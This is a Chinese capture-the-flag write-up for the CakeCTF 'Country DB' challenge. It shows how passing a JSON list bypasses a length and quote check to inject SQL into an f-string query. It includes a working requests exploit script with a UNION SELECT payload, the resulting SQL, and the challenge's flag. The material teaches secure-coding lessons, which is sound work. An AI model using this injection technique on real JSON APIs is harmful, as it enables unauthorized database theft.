# Country DB

## 题目简述

题目是国家代码查询接口。后端用 `/api/search` 接收 JSON 中的 `code`，校验 `len(code)==2` 且禁止单引号字符，然后直接拼接进 SQL 并执行：

```sql
SELECT name FROM country WHERE code=UPPER('{code}')
```

同时，初始化脚本中存在 `flag` 表（`flag(flag TEXT)`），`country` 表用于查询国家名。题目机制是典型的“看似字符串长度约束”的 SQL 注入，利用点在“类型与长度校验绕过 + 字符串插入位置可控”。

官方 flag：`CakeCTF{b3_c4refUl_wh3n_y0U_u5e_JS0N_1nPut}`

## 解题过程

### 关键观察

- `api_search` 里 `req = flask.request.get_json()`，`code = req['code']`，并做 `len(code) != 2 or "'" in code` 的检查。
- 后端并没有做参数化查询，直接 `f-string` 进 SQL。
- `req['code']` 在 Python 层只做“长度与字符存在性”判断，因此不是字符串时，也会被放进查询。

### 利用链

官方解题脚本利用 `code` 传入一个列表，绕过长度与 `'` 的检查，然后利用 Python 对 `list` 的字符串表示与 SQL 字符串拼接产生注入面：

```python
code = ["') UNION SELECT flag FROM flag;--", "wow"]
r = requests.post(f"{URL}/api/search",
                  headers={"Content-Type": "application/json"},
                  data=json.dumps({"code": code}))
print(r.text)
```

其因果链是：

- `len(code)` 对列表返回 2，`"'" in code` 只检查列表元素是否等于单引号，不匹配任意成员。
- 拼接 SQL 时 `code` 被格式化为列表字符串，`UPPER('{code}')` 位置可插入闭合与注入片段。
- 注入语句从 `country` 查询切到 `flag` 表查询，`db_search` 返回的第一条记录即泄露 flag。

Python 会根据元素内容选择引号，因此本题载荷实际形成的 SQL 是：

```sql
SELECT name FROM country WHERE code=UPPER('["') UNION SELECT flag FROM flag;--", 'wow']')
```

其中 `UPPER('["')` 只是原查询的一个无关条件；随后 `UNION SELECT flag FROM flag` 把 flag 合并进结果集，`--` 注释掉列表字符串剩余部分。这里无需猜测数据库对 JSON 数组的处理方式，关键是 Python 的 `list.__str__()` 在进入 SQLite 前已经制造出引号和闭合括号。

### 验证

- POST 后返回的响应体直接是 JSON，`name` 字段为注入得到的 `flag`。
- 与官方 `task.yml` 的 `flag` 一致即可完成验证。
- 该链路不依赖前端界面行为，纯服务端请求可复现。

## 方法总结

- 核心技巧：长度过滤不等于类型安全；当输入被用于 SQL 字符串拼接，Python 层类型未约束即可产生绕过空间。
- 识别信号：`len(x)` + 字符过滤看似足够，却仍走 `f-string` 执行 SQL、没有参数化查询。
- 复用要点：对 JSON 接口尤其要看 `get_json()` 后的字段类型与后续 SQL 拼接方式；`len()`、`in` 等检查容易对非字符串输入失效，常可形成注入。
